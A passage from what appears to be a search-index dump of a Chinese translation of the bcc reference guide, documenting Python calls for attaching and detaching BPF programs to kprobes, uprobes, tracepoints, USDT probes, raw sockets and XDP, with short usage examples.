<p>\u521b\u5efa\u4e00\u4e2a\u5bf9\u8c61\u4ee5\u68c0\u6d4b\u7528\u6237\u9759\u6001\u5b9a\u4e49\u7684\u8ddf\u8e2a(USDT)\u63a2\u9488\u3002\u5b83\u7684\u4e3b\u8981\u65b9\u6cd5\u662f<code>enable_probe()</code>\u3002</p> <p>\u53c2\u6570:</p> <ul> <li>pid: \u9644\u52a0\u5230\u8be5\u8fdb\u7a0bID\u3002</li> <li>path: \u4ece\u6b64\u4e8c\u8fdb\u5236\u8def\u5f84\u68c0\u6d4bUSDT\u63a2\u9488\u3002</li> </ul> <p>\u793a\u4f8b:</p> <pre><code># \u5305\u62ec\u4e00\u4e2aUSDT\u5bf9\u8c61:\nu = USDT(pid=int(pid))\n[...]\nb = BPF(text=bpf_text, usdt_contexts=[u])\n</code></pre> <p>\u5728\u539f\u5730\u7684\u793a\u4f8b: \u641c\u7d22 /examples, \u641c\u7d22 /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide/#_11","title":"\u4e8b\u4ef6","text":""},{"location":"tutorials/bcc-documents/reference_guide/#1-attach_kprobe","title":"1. attach_kprobe()","text":"<p>\u8bed\u6cd5: <code>BPF.attach_kprobe(event=\"event\", fn_name=\"name\")</code></p> <p>\u901a\u8fc7\u5185\u6838\u52a8\u6001\u8ddf\u8e2a\u51fd\u6570\u5165\u53e3\uff0c\u6765\u68c0\u6d4b\u5185\u6838\u51fd\u6570<code>event()</code>\uff0c\u5e76\u5c06\u6211\u4eec\u7684C\u5b9a\u4e49\u7684\u51fd\u6570<code>name()</code>\u9644\u52a0\u5230\u6bcf\u6b21\u8c03\u7528\u5185\u6838\u51fd\u6570\u65f6\u88ab\u8c03\u7528\u3002</p> <p>\u4f8b\u5982:</p> <pre><code>b.attach_kprobe(event=\"sys_clone\", fn_name=\"do_trace\")\n</code></pre> <p>\u8fd9\u5c06\u68c0\u6d4b\u5185\u6838<code>sys_clone()</code>\u51fd\u6570\uff0c\u5e76\u5728\u6bcf\u6b21\u8c03\u7528\u65f6\u8fd0\u884c\u6211\u4eec\u5b9a\u4e49\u7684BPF\u51fd\u6570<code>do_trace()</code>\u3002</p> <p>\u60a8\u53ef\u4ee5\u591a\u6b21\u8c03\u7528attach_kprobe()\uff0c\u5e76\u5c06\u60a8\u7684BPF\u51fd\u6570\u9644\u52a0\u5230\u591a\u4e2a\u5185\u6838\u51fd\u6570\u4e0a\u3002\u60a8\u4e5f\u53ef\u4ee5\u591a\u6b21\u8c03\u7528attach_kprobe()\u51fd\u6570\u5c06\u591a\u4e2aBPF\u51fd\u6570\u9644\u52a0\u5230\u540c\u4e00\u4e2a\u5185\u6838\u51fd\u6570\u3002</p> <p>\u6709\u5173\u5982\u4f55\u4eceBPF\u4e2d\u63d0\u53d6\u53c2\u6570\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605\u524d\u9762\u7684kprobes\u90e8\u5206\u3002</p> <p>\u793a\u4f8b\uff1a \u67e5\u627e/examples, \u67e5\u627e/tools</p>"},{"location":"tutorials/bcc-documents/reference_guide/#2-attach_kretprobe","title":"2. attach_kretprobe()","text":"<p>\u8bed\u6cd5\uff1aBPF.attach_kretprobe(event=\"\u4e8b\u4ef6\", fn_name=\"\u540d\u79f0\" [, maxactive=int])</p> <p>\u4f7f\u7528\u5185\u6838\u52a8\u6001\u8ddf\u8e2a\u51fd\u6570\u8fd4\u56de\u6765\u68c0\u6d4b\u5185\u6838\u51fd\u6570event()\u7684\u8fd4\u56de\uff0c\u5e76\u9644\u52a0\u6211\u4eec\u5b9a\u4e49\u7684C\u51fd\u6570name()\u5728\u5185\u6838\u51fd\u6570\u8fd4\u56de\u65f6\u8c03\u7528\u3002</p> <p>\u4f8b\u5982\uff1a</p> <pre><code>b.attach_kretprobe(event=\"vfs_read\", fn_name=\"do_return\")\n</code></pre> <p>\u8fd9\u5c06\u68c0\u6d4b\u5185\u6838\u7684vfs_read()\u51fd\u6570\uff0c\u6bcf\u6b21\u8c03\u7528\u8be5\u51fd\u6570\u65f6\u90fd\u4f1a\u6267\u884c\u6211\u4eec\u5b9a\u4e49\u7684BPF\u51fd\u6570do_return()\u3002</p> <p>\u60a8\u53ef\u4ee5\u591a\u6b21\u8c03\u7528attach_kretprobe()\u51fd\u6570\uff0c\u5e76\u5c06\u60a8\u7684BPF\u51fd\u6570\u9644\u52a0\u5230\u591a\u4e2a\u5185\u6838\u51fd\u6570\u7684\u8fd4\u56de\u503c\u3002 \u60a8\u4e5f\u53ef\u4ee5\u591a\u6b21\u8c03\u7528attach_kretprobe()\u51fd\u6570\u5c06\u591a\u4e2aBPF\u51fd\u6570\u9644\u52a0\u5230\u540c\u4e00\u4e2a\u5185\u6838\u51fd\u6570\u7684\u8fd4\u56de\u503c\u3002</p> <p>\u5f53\u5728\u5185\u6838\u51fd\u6570\u4e0a\u5b89\u88c5kretprobe\u65f6\uff0c\u5b83\u53ef\u4ee5\u6355\u83b7\u7684\u5e76\u884c\u8c03\u7528\u6b21\u6570\u5b58\u5728\u9650\u5236\u3002\u60a8\u53ef\u4ee5\u4f7f\u7528maxactive\u53c2\u6570\u66f4\u6539\u8be5\u9650\u5236\u3002\u6709\u5173\u9ed8\u8ba4\u503c\uff0c\u8bf7\u53c2\u9605kprobes\u6587\u6863\u3002</p> <p>\u6709\u5173\u5982\u4f55\u4eceBPF\u4e2d\u63d0\u53d6\u8fd4\u56de\u503c\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605\u524d\u9762\u7684kretprobes\u90e8\u5206\u3002</p> <p>\u793a\u4f8b\uff1a \u67e5\u627e/examples, \u67e5\u627e/tools</p>"},{"location":"tutorials/bcc-documents/reference_guide/#3-attach_tracepoint","title":"3. attach_tracepoint()","text":"<p>\u8bed\u6cd5\uff1aBPF.attach_tracepoint(tp=\"\u8ffd\u8e2a\u70b9\", fn_name=\"\u540d\u79f0\")</p> <p>\u68c0\u6d4b\u7531tracepoint\u63cf\u8ff0\u7684\u5185\u6838\u8ffd\u8e2a\u70b9\uff0c\u5e76\u5728\u547d\u4e2d\u65f6\u8fd0\u884cBPF\u51fd\u6570name()\u3002\u8fd9\u662f\u4e00\u79cd\u663e\u5f0f\u65b9\u5f0f\u6765\u64cd\u63a7 tracepoints\u3002\u5728\u524d\u9762\u7684 tracepoints \u90e8\u5206\u8bb2\u89e3\u8fc7\u7684 <code>TRACEPOINT_PROBE</code> \u8bed\u6cd5\u662f\u53e6\u4e00\u79cd\u65b9\u6cd5\uff0c\u5176\u4f18\u70b9\u662f\u81ea\u52a8\u58f0\u660e\u4e00\u4e2a\u5305\u542b tracepoint \u53c2\u6570\u7684 <code>args</code> \u7ed3\u6784\u4f53\u3002\u5728\u4f7f\u7528 <code>attach_tracepoint()</code> \u65f6\uff0ctracepoint \u53c2\u6570\u9700\u8981\u5728 BPF \u7a0b\u5e8f\u4e2d\u58f0\u660e\u3002</p> <p>\u4f8b\u5982\uff1a</p> <pre><code># \u5b9a\u4e49 BPF \u7a0b\u5e8f\nbpf_text = \"\"\"\n#include &lt;uapi/linux/ptrace.h&gt;\n\nstruct urandom_read_args {\n    // \u6765\u81ea /sys/kernel/debug/tracing/events/random/urandom_read/format\n    u64 __unused__;\n    u32 got_bits;\n    u32 pool_left;\n    u32 input_left;\n};\n\nint printarg(struct urandom_read_args *args) {\n    bpf_trace_printk(\"%d\\\\n\", args-&gt;got_bits);\n    return 0;\n};\n\"\"\"\n\n# \u52a0\u8f7d BPF \u7a0b\u5e8f\nb = BPF(text=bpf_text)\nb.attach_tracepoint(\"random:urandom_read\", \"printarg\")\n</code></pre> <p>\u6ce8\u610f\uff0c<code>printarg()</code> \u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u73b0\u5728\u662f\u6211\u4eec\u5b9a\u4e49\u7684\u7ed3\u6784\u4f53\u3002</p> <p>\u4ee3\u7801\u793a\u4f8b\uff1a code, search /examples, search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide/#4-attach_uprobe","title":"4. attach_uprobe()","text":"<p>\u8bed\u6cd5\uff1a<code>BPF.attach_uprobe(name=\"location\", sym=\"symbol\", fn_name=\"name\" [, sym_off=int])</code>, <code>BPF.attach_uprobe(name=\"location\", sym_re=\"regex\", fn_name=\"name\")</code>, <code>BPF.attach_uprobe(name=\"location\", addr=int, fn_name=\"name\")</code></p> <p>\u7528\u4e8e\u64cd\u63a7\u4f4d\u4e8e <code>location</code> \u4e2d\u7684\u5e93\u6216\u4e8c\u8fdb\u5236\u6587\u4ef6\u4e2d\u7684\u7528\u6237\u7ea7\u522b\u51fd\u6570 <code>symbol()</code>\uff0c\u4f7f\u7528\u7528\u6237\u7ea7\u522b\u52a8\u6001\u8ddf\u8e2a\u8be5\u51fd\u6570\u7684\u5165\u53e3\uff0c\u5e76\u5c06\u6211\u4eec\u5b9a\u4e49\u7684 C \u51fd\u6570 <code>name()</code> \u9644\u52a0\u4e3a\u5728\u7528\u6237\u7ea7\u522b\u51fd\u6570\u88ab\u8c03\u7528\u65f6\u8c03\u7528\u7684\u51fd\u6570\u3002\u5982\u679c\u7ed9\u5b9a\u4e86 <code>sym_off</code>\uff0c\u5219\u8be5\u51fd\u6570\u5c06\u9644\u52a0\u5230\u7b26\u53f7\u7684\u504f\u79fb\u91cf\u4e0a\u3002\u771f\u5b9e\u7684\u5730\u5740<code>addr</code>\u53ef\u4ee5\u66ff\u4ee3<code>sym</code>\uff0c\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c<code>sym</code>\u5fc5\u987b\u8bbe\u7f6e\u4e3a\u5176\u9ed8\u8ba4\u503c\u3002\u5982\u679c\u6587\u4ef6\u662f\u975ePIE\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u5219<code>addr</code>\u5fc5\u987b\u662f\u865a\u62df\u5730\u5740\uff0c\u5426\u5219\u5b83\u5fc5\u987b\u662f\u76f8\u5bf9\u4e8e\u6587\u4ef6\u52a0\u8f7d\u5730\u5740\u7684\u504f\u79fb\u91cf\u3002</p> <p>\u53ef\u4ee5\u5728<code>sym_re</code>\u4e2d\u63d0\u4f9b\u666e\u901a\u8868\u8fbe\u5f0f\u6765\u4ee3\u66ff\u7b26\u53f7\u540d\u79f0\u3002\u7136\u540e\uff0cuprobes\u5c06\u9644\u52a0\u5230\u4e0e\u63d0\u4f9b\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u5339\u914d\u7684\u7b26\u53f7\u3002</p> <p>\u5728\u540d\u5b57\u53c2\u6570\u4e2d\u53ef\u4ee5\u7ed9\u51fa\u5e93\u540d\u800c\u4e0d\u5e26lib\u524d\u7f00\uff0c\u6216\u8005\u7ed9\u51fa\u5b8c\u6574\u8def\u5f84\uff08/usr/lib/...\uff09\u3002\u53ea\u80fd\u901a\u8fc7\u5b8c\u6574\u8def\u5f84\uff08/bin/sh\uff09\u7ed9\u51fa\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002</p> <p>\u4f8b\u5982:</p> <pre><code>b.attach_uprobe(name=\"c\", sym=\"strlen\", fn_name=\"count\")\n</code></pre> <p>\u8fd9\u5c06\u5728libc\u4e2d\u5bf9<code>strlen()</code>\u51fd\u6570\u8fdb\u884c\u63d2\u88c5\uff0c\u5e76\u5728\u8c03\u7528\u8be5\u51fd\u6570\u65f6\u8c03\u7528\u6211\u4eec\u7684BPF\u51fd\u6570<code>count()</code>\u3002\u8bf7\u6ce8\u610f\uff0c\u5728<code>libc</code>\u4e2d\u7684<code>libc</code>\u4e2d\u7684\"lib\"\u662f\u4e0d\u5fc5\u8981\u7684\u3002</p> <p>\u5176\u4ed6\u4f8b\u5b50:</p> <pre><code>b.attach_uprobe(name=\"c\", sym=\"getaddrinfo\", fn_name=\"do_entry\")\nb.attach_uprobe(name=\"/usr/bin/python\", sym=\"main\", fn_name=\"do_main\")\n</code></pre> <p>\u60a8\u53ef\u4ee5\u591a\u6b21\u8c03\u7528attach_uprobe()\uff0c\u5e76\u5c06BPF\u51fd\u6570\u9644\u52a0\u5230\u591a\u4e2a\u7528\u6237\u7ea7\u51fd\u6570\u3002</p> <p>\u6709\u5173\u5982\u4f55\u4eceBPF\u5de5\u5177\u83b7\u53d6\u53c2\u6570\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1\u4e0a\u4e00\u8282uprobes\u3002</p> <p>\u539f\u5740\u793a\u4f8b\uff1a search /examples, search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide/#5-attach_uretprobe","title":"5. attach_uretprobe()","text":"<p>\u8bed\u6cd5: <code>BPF.attach_uretprobe(name=\"location\", sym=\"symbol\", fn_name=\"name\")</code></p> <p>\u4f7f\u7528\u7528\u6237\u7ea7\u52a8\u6001\u8ddf\u8e2a\u4ece\u540d\u4e3a<code>location</code>\u7684\u5e93\u6216\u4e8c\u8fdb\u5236\u6587\u4ef6\u4e2d\u7684\u7528\u6237\u7ea7\u51fd\u6570<code>symbol()</code>\u8fd4\u56de\u503c\u7684\u65b9\u5f0f\u4eea\u5668\u5316\uff0c\u5e76\u5c06\u6211\u4eec\u5b9a\u4e49\u7684C\u51fd\u6570<code>name()</code>\u9644\u52a0\u5230\u7528\u6237\u7ea7\u51fd\u6570\u8fd4\u56de\u65f6\u8c03\u7528\u3002</p> <p>\u4f8b\u5982:</p> <pre><code>b.attach_uretprobe(name=\"c\", sym=\"strlen\", fn_name=\"count\")\n```\u3002\u8fd9\u5c06\u4f7f\u7528libc\u5e93\u5bf9```strlen()```\u51fd\u6570\u8fdb\u884c\u63d2\u88c5\uff0c\u5e76\u5728\u5176\u8fd4\u56de\u65f6\u8c03\u7528\u6211\u4eec\u7684BPF\u51fd\u6570```count()```\u3002\n\n\u5176\u4ed6\u793a\u4f8b\uff1a\n\n```Python\nb.attach_uretprobe(name=\"c\", sym=\"getaddrinfo\", fn_name=\"do_return\")\nb.attach_uretprobe(name=\"/usr/bin/python\", sym=\"main\", fn_name=\"do_main\")\n</code></pre> <p>\u60a8\u53ef\u4ee5\u591a\u6b21\u8c03\u7528attach_uretprobe()\uff0c\u5e76\u5c06\u60a8\u7684BPF\u51fd\u6570\u9644\u52a0\u5230\u591a\u4e2a\u7528\u6237\u7ea7\u51fd\u6570\u4e0a\u3002</p> <p>\u6709\u5173\u5982\u4f55\u5bf9BPF\u8fd4\u56de\u503c\u8fdb\u884c\u63d2\u88c5\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605\u524d\u9762\u7684uretprobes\u90e8\u5206\u3002</p> <p>\u5185\u90e8\u793a\u4f8b\uff1a \u641c\u7d22/examples, \u641c\u7d22/tools</p>"},{"location":"tutorials/bcc-documents/reference_guide/#6-usdtenable_probe","title":"6. USDT.enable_probe()","text":"<p>\u8bed\u6cd5\uff1a<code>USDT.enable_probe(probe=probe, fn_name=name)</code></p> <p>\u5c06BPF C\u51fd\u6570<code>name</code>\u9644\u52a0\u5230USDT\u63a2\u9488<code>probe</code>\u3002</p> <p>\u793a\u4f8b\uff1a</p> <pre><code># \u6839\u636e\u7ed9\u5b9a\u7684PID\u542f\u7528USDT\u63a2\u9488\nu = USDT(pid=int(pid))\nu.enable_probe(probe=\"http__server__request\", fn_name=\"do_trace\")\n</code></pre> <p>\u8981\u68c0\u67e5\u60a8\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u662f\u5426\u5177\u6709USDT\u63a2\u9488\u4ee5\u53ca\u5b83\u4eec\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u53ef\u4ee5\u8fd0\u884c<code>readelf -n binary</code>\u5e76\u68c0\u67e5stap\u8c03\u8bd5\u90e8\u5206\u3002</p> <p>\u5185\u90e8\u793a\u4f8b\uff1a \u641c\u7d22/examples, \u641c\u7d22/tools</p>"},{"location":"tutorials/bcc-documents/reference_guide/#7-attach_raw_tracepoint","title":"7. attach_raw_tracepoint()","text":"<p>\u8bed\u6cd5\uff1a<code>BPF.attach_raw_tracepoint(tp=\"tracepoint\", fn_name=\"name\")</code></p> <p>\u5bf9\u7531<code>tracepoint</code>\uff08\u4ec5<code>event</code>\uff0c\u65e0<code>category</code>\uff09\u63cf\u8ff0\u7684\u5185\u6838\u539f\u59cb\u8ddf\u8e2a\u70b9\u8fdb\u884c\u63d2\u88c5\uff0c\u5e76\u5728\u547d\u4e2d\u65f6\u8fd0\u884cBPF\u51fd\u6570<code>name()</code>\u3002</p> <p>\u8fd9\u662f\u4e00\u79cd\u660e\u786e\u7684\u63d2\u88c5\u8ddf\u8e2a\u70b9\u7684\u65b9\u6cd5\u3002\u65e9\u671f\u539f\u59cb\u8ddf\u8e2a\u70b9\u90e8\u5206\u4ecb\u7ecd\u7684<code>RAW_TRACEPOINT_PROBE</code>\u8bed\u6cd5\u662f\u4e00\u79cd\u66ff\u4ee3\u65b9\u6cd5\u3002</p> <p>\u4f8b\u5982\uff1a</p> <pre><code>b.attach_raw_tracepoint(\"sched_switch\", \"do_trace\")\n</code></pre> <p>\u5185\u90e8\u793a\u4f8b\uff1a\".\"\u641c\u7d22 /\u5de5\u5177</p>"},{"location":"tutorials/bcc-documents/reference_guide/#8-attach_raw_socket","title":"8. attach_raw_socket()","text":"<p>\u8bed\u6cd5: <code>BPF.attach_raw_socket(fn, dev)</code></p> <p>\u5c06\u4e00\u4e2aBPF\u51fd\u6570\u9644\u52a0\u5230\u6307\u5b9a\u7684\u7f51\u7edc\u63a5\u53e3\u3002</p> <p><code>fn</code> \u5fc5\u987b\u662f <code>BPF.function</code> \u7c7b\u578b\uff0c\u5e76\u4e14 bpf_prog \u7c7b\u578b\u9700\u8981\u662f <code>BPF_PROG_TYPE_SOCKET_FILTER</code>  (<code>fn=BPF.load_func(func_name, BPF.SOCKET_FILTER)</code>)</p> <p><code>fn.sock</code> \u662f\u4e00\u4e2a\u975e\u963b\u585e\u539f\u59cb\u5957\u63a5\u5b57\uff0c\u5df2\u7ecf\u521b\u5efa\u5e76\u7ed1\u5b9a\u5230 <code>dev</code>\u3002</p> <p>\u6240\u6709\u5904\u7406 <code>dev</code> \u7684\u7f51\u7edc\u6570\u636e\u5305\u90fd\u4f1a\u5728\u7ecf\u8fc7 bpf_prog \u5904\u7406\u540e\uff0c\u88ab\u590d\u5236\u5230 <code>fn.sock</code> \u7684 <code>recv-q</code> \u4e2d\u3002\u53ef\u4ee5\u4f7f\u7528 <code>recv/recvfrom/recvmsg</code> \u6765\u4ece <code>fn.sock</code> \u63a5\u6536\u6570\u636e\u5305\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5982\u679c\u5728 <code>recv-q</code> \u6ee1\u4e86\u4e4b\u540e\u6ca1\u6709\u53ca\u65f6\u8bfb\u53d6\uff0c\u590d\u5236\u7684\u6570\u636e\u5305\u5c06\u4f1a\u88ab\u4e22\u5f03\u3002</p> <p>\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e2a\u529f\u80fd\u6765\u50cf <code>tcpdump</code> \u4e00\u6837\u6355\u83b7\u7f51\u7edc\u6570\u636e\u5305\u3002</p> <p>\u53ef\u4ee5\u4f7f\u7528<code>ss --bpf --packet -p</code>\u6765\u89c2\u5bdf <code>fn.sock</code>\u3002</p> <p>\u793a\u4f8b:</p> <pre><code>BPF.attach_raw_socket(bpf_func, ifname)\n</code></pre> <p>\u793a\u4f8b\u4f4d\u7f6e: \u641c\u7d22 /\u793a\u4f8b</p>"},{"location":"tutorials/bcc-documents/reference_guide/#9-attach_xdp","title":"9. attach_xdp()","text":"<p>\u8bed\u6cd5: <code>BPF.attach_xdp(dev=\"device\", fn=b.load_func(\"fn_name\",BPF.XDP), flags)</code></p> <p>\u6539\u88c5\u7531 <code>dev</code> \u63cf\u8ff0\u7684\u7f51\u7edc\u9a71\u52a8\u7a0b\u5e8f\uff0c\u7136\u540e\u63a5\u6536\u6570\u636e\u5305\uff0c\u5e76\u4f7f\u7528\u6807\u5fd7\u8fd0\u884c BPF \u51fd\u6570 <code>fn_name()</code>\u3002</p> <p>\u4ee5\u4e0b\u662f\u53ef\u9009\u7684\u6807\u5fd7\u5217\u8868\u3002</p> <pre><code># from xdp_flags uapi/linux/if_link.h\nXDP_FLAGS_UPDATE_IF_NOEXIST = (1 &lt;&lt; 0)\nXDP_FLAGS_SKB_MODE = (1 &lt;&lt; 1)\nXDP_FLAGS_DRV_MODE = (1 &lt;&lt; 2)\nXDP_FLAGS_HW_MODE = (1 &lt;&lt; 3)\nXDP_FLAGS_REPLACE = (1 &lt;&lt; 4)\n</code></pre> <p>\u60a8\u53ef\u4ee5\u50cf\u8fd9\u6837\u4f7f\u7528\u6807\u5fd7: <code>BPF.attach_xdp(dev=\"device\", fn=b.load_func(\"fn_name\",BPF.XDP), flags=BPF.XDP_FLAGS_UPDATE_IF_NOEXIST)</code></p> <p>\u6807\u5fd7\u7684\u9ed8\u8ba4\u503c\u4e3a0\u3002\u8fd9\u610f\u5473\u7740\u5982\u679c\u6ca1\u6709\u5e26\u6709 <code>device</code> \u7684xdp\u7a0b\u5e8f\uff0cfn\u5c06\u5728\u8be5\u8bbe\u5907\u4e0a\u8fd0\u884c\u3002\u5982\u679c\u6709\u4e00\u4e2a\u6b63\u5728\u8fd0\u884c\u7684xdp\u7a0b\u5e8f\u4e0e\u8bbe\u5907\u5173\u8054\uff0c\u65e7\u7a0b\u5e8f\u5c06\u88ab\u65b0\u7684fn\u7a0b\u5e8f\u66ff\u6362\u3002\".\u5f53\u524d\uff0cbcc\u4e0d\u652f\u6301XDP_FLAGS_REPLACE\u6807\u5fd7\u3002\u4ee5\u4e0b\u662f\u5176\u4ed6\u6807\u5fd7\u7684\u63cf\u8ff0\u3002</p>"},{"location":"tutorials/bcc-documents/reference_guide/#1-xdp_flags_update_if_noexist","title":"1. XDP_FLAGS_UPDATE_IF_NOEXIST","text":"<p>\u5982\u679c\u5df2\u7ecf\u5c06XDP\u7a0b\u5e8f\u9644\u52a0\u5230\u6307\u5b9a\u7684\u9a71\u52a8\u7a0b\u5e8f\u4e0a\uff0c\u518d\u6b21\u9644\u52a0XDP\u7a0b\u5e8f\u5c06\u5931\u8d25\u3002</p>"},{"location":"tutorials/bcc-documents/reference_guide/#2-xdp_flags_skb_mode","title":"2. XDP_FLAGS_SKB_MODE","text":"<p>\u9a71\u52a8\u7a0b\u5e8f\u4e0d\u652f\u6301XDP\uff0c\u4f46\u5185\u6838\u6a21\u62df\u652f\u6301\u5b83\u3002 XDP\u7a0b\u5e8f\u53ef\u4ee5\u5de5\u4f5c\uff0c\u4f46\u6ca1\u6709\u771f\u6b63\u7684\u6027\u80fd\u4f18\u52bf\uff0c\u56e0\u4e3a\u6570\u636e\u5305\u65e0\u8bba\u5982\u4f55\u90fd\u4f1a\u4f20\u9012\u7ed9\u5185\u6838\u5806\u6808\uff0c\u7136\u540e\u6a21\u62dfXDP - \u8fd9\u901a\u5e38\u9002\u7528\u4e8e\u5bb6\u7528\u7535\u8111\uff0c\u7b14\u8bb0\u672c\u7535\u8111\u548c\u865a\u62df\u5316\u786c\u4ef6\u6240\u4f7f\u7528\u7684\u901a\u7528\u7f51\u7edc\u9a71\u52a8\u7a0b\u5e8f\u3002</p>"},{"location":"tutorials/bcc-documents/reference_guide/#3-xdp_flags_drv_mode","title":"3. XDP_FLAGS_DRV_MODE","text":"<p>\u9a71\u52a8\u7a0b\u5e8f\u5177\u6709XDP\u652f\u6301\uff0c\u5e76\u4e14\u53ef\u4ee5\u5c06\u6570\u636e\u5305\u76f4\u63a5\u4f20\u9012\u7ed9XDP\uff0c\u65e0\u9700\u5185\u6838\u5806\u6808\u4ea4\u4e92 - \u5c11\u6570\u9a71\u52a8\u7a0b\u5e8f\u53ef\u4ee5\u652f\u6301\u6b64\u529f\u80fd\uff0c\u901a\u5e38\u7528\u4e8e\u4f01\u4e1a\u7ea7\u786c\u4ef6\u3002</p>"},{"location":"tutorials/bcc-documents/reference_guide/#4-xdp_flags_hw_mode","title":"4. XDP_FLAGS_HW_MODE","text":"<p>XDP\u53ef\u4ee5\u76f4\u63a5\u5728NIC\u4e0a\u52a0\u8f7d\u548c\u6267\u884c - \u53ea\u6709\u5c11\u6570NIC\u652f\u6301\u8fd9\u4e00\u529f\u80fd\u3002</p> <p>\u4f8b\u5982\uff1a</p> <pre><code>b.attach_xdp(dev=\"ens1\", fn=b.load_func(\"do_xdp\", BPF.XDP))\n</code></pre> <p>\u8fd9\u5c06\u4e3a\u7f51\u7edc\u8bbe\u5907<code>ens1</code>\u5b89\u88c5\u5de5\u5177\uff0c\u5e76\u5728\u63a5\u6536\u6570\u636e\u5305\u65f6\u8fd0\u884c\u6211\u4eec\u5b9a\u4e49\u7684BPF\u51fd\u6570<code>do_xdp()</code>\u3002</p> <p>\u4e0d\u8981\u5fd8\u8bb0\u5728\u6700\u540e\u8c03\u7528<code>b.remove_xdp(\"ens1\")</code>\uff01</p> <p>\u793a\u4f8b\uff1a \u641c\u7d22/examples, \u641c\u7d22/tools</p>"},{"location":"tutorials/bcc-documents/reference_guide/#10-attach_func","title":"10. attach_func()","text":"<p>\u8bed\u6cd5\uff1a<code>BPF.attach_func(fn, attachable_fd, attach_type [, flags])</code></p> <p>\u5c06\u6307\u5b9a\u7c7b\u578b\u7684BPF\u51fd\u6570\u9644\u52a0\u5230\u7279\u5b9a\u7684<code>attachable_fd</code>\u4e0a\u3002\u5982\u679c<code>attach_type</code>\u662f<code>BPF_FLOW_DISSECTOR</code>\uff0c\u5219\u9884\u671f\u8be5\u51fd\u6570\u5c06\u9644\u52a0\u5230\u5f53\u524d\u7684\u7f51\u7edc\u547d\u540d\u7a7a\u95f4\uff0c\u5e76\u4e14<code>attachable_fd</code>\u5fc5\u987b\u4e3a0\u3002</p> <p>\u4f8b\u5982\uff1a</p> <pre><code>b.attach_func(fn, cgroup_fd, BPFAttachType.CGROUP_SOCK_OPS)\nb.attach_func(fn, map_fd, BPFAttachType.SK_MSG_VERDICT)\n```\u6ce8\u610f\u3002\u5f53\u9644\u52a0\u5230\u201c\u5168\u5c40\u201d\u94a9\u5b50\uff08xdp\u3001tc\u3001lwt\u3001cgroup\uff09\u65f6\u3002\u5982\u679c\u7a0b\u5e8f\u7ec8\u6b62\u540e\u4e0d\u518d\u9700\u8981\u201cBPF \u51fd\u6570\u201d\uff0c\u8bf7\u786e\u4fdd\u5728\u7a0b\u5e8f\u9000\u51fa\u65f6\u8c03\u7528 `detach_func`\u3002\n\n\u793a\u4f8b\u4e2d\u7684\u5185\u90e8\u4ee3\u7801\uff1a\n\n[search /examples](https://github.com/iovisor/bcc/search?q=attach_func+path%3Aexamples+language%3Apython&amp;type=Code),\n\n### 11. detach_func()\n\n\u8bed\u6cd5\uff1a```BPF.detach_func(fn, attachable_fd, attach_type)```\n\n\u65ad\u5f00\u6307\u5b9a\u7c7b\u578b\u7684 BPF \u51fd\u6570\u3002\n\n\u4f8b\u5982\uff1a\n\n```Python\nb.detach_func(fn, cgroup_fd, BPFAttachType.CGROUP_SOCK_OPS)  // \u65ad\u5f00 cgroup_fd \u4e0a\u7684 fn \u51fd\u6570\nb.detach_func(fn, map_fd, BPFAttachType.SK_MSG_VERDICT)  // \u65ad\u5f00 map_fd \u4e0a\u7684 fn \u51fd\u6570\n</code></pre> <p>\u793a\u4f8b\u4e2d\u7684\u5185\u90e8\u4ee3\u7801\uff1a</p> <p>search /examples,</p>"},{"location":"tutorials/bcc-documents/reference_guide/#12-detach_kprobe","title":"12. detach_kprobe()","text":"<p>\u8bed\u6cd5\uff1a<code>BPF.detach_kprobe(event=\"event\", fn_name=\"name\")</code></p> <p>\u65ad\u5f00\u6307\u5b9a\u4e8b\u4ef6\u7684 kprobe \u5904\u7406\u51fd\u6570\u3002</p> <p>\u4f8b\u5982\uff1a</p> <pre><code>b.detach_kprobe(event=\"__page_cache_alloc\", fn_name=\"trace_func_entry\")  // \u65ad\u5f00 \"__page_cache_alloc\" \u4e8b\u4ef6\u4e0a\u7684 \"trace_func_entry\" \u51fd\u6570\n</code></pre>"},{"location":"tutorials/bcc-documents/reference_guide/#13-detach_kretprobe","title":"13. detach_kretprobe()","text":"<p>\u8bed\u6cd5\uff1a<code>BPF.detach_kretprobe(event=\"event\", fn_name=\"name\")</code></p> <p>\u65ad\u5f00\u6307\u5b9a\u4e8b\u4ef6\u7684 kretprobe \u5904\u7406\u51fd\u6570\u3002</p> <p>\u4f8b\u5982\uff1a</p> <pre><code>b.detach_kretprobe(event=\"__page_cache_alloc\", fn_name=\"trace_func_return\")  // \u65ad\u5f00 \"__page_cache_alloc\" \u4e8b\u4ef6\u4e0a\u7684 \"trace_func_return\" \u51fd\u6570\n</code></pre>"},{"location":"tutorials/bcc-documents/reference_guide/#_12","title":"\u8c03\u8bd5\u8f93\u51fa","text":""},{"location":"tutorials/bcc-documents/reference_guide/#1-trace_print","title":"1. trace_print()","text":"<p>\u8bed\u6cd5\uff1a<code>BPF.trace_print(fmt=\"fields\")</code></p> <p>\u8be5\u65b9\u6cd5\u6301\u7eed\u8bfb\u53d6\u5168\u5c40\u5171\u4eab\u7684 <code>/sys/kernel/debug/tracing/trace_pipe</code> \u6587\u4ef6\u5e76\u6253\u5370\u5176\u5185\u5bb9\u3002\u53ef\u4ee5\u901a\u8fc7 BPF \u548c <code>bpf_trace_printk()</code> 